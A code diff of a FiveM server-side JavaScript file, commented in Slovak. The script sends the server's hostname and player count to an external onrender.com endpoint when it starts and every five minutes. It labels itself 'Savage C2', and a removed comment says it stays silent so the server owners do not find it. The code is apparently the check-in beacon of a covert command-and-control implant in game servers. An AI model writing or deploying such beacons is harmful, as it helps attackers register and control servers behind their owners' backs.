@@ -1,19 +1,21 @@
-// script.js - FiveM Server Side
 function sendUpdate() {
     const data = {
         hostname: GetConvar("sv_hostname", "Default Server"),
         players: GetNumPlayerIndices()
     };
 
-    // Tu zadaj svoju IP ak to dávaš na hosting, inak localhost
-    const url = "http://localhost:3000/api/report"; 
+    // TU ZMEŇ ADRESU NA TVOJU Z RENDERU
+    const url = "https://mv-menu.onrender.com/api/report"; 
 
     PerformHttpRequest(url, function(err, text, headers) {
-        // Tichý režim - nič nevypisujeme do konzoly servera, aby nás nenašli
+        if (err === 200) {
+            print("^2[Savage C2] Report odoslaný úspešne!^7");
+        } else {
+            print("^1[Savage C2] Chyba pri odosielaní: " + err + "^7");
+        }
     }, 'POST', JSON.stringify(data), { ['Content-Type']: 'application/json' });
 }
 
-// Pošle info každých 5 minút
-setInterval(sendUpdate, 300000);
-// Pošle info hneď po štarte
+// Spustenie pri štarte a potom každých 5 minút
 sendUpdate();
+setInterval(sendUpdate, 300000);
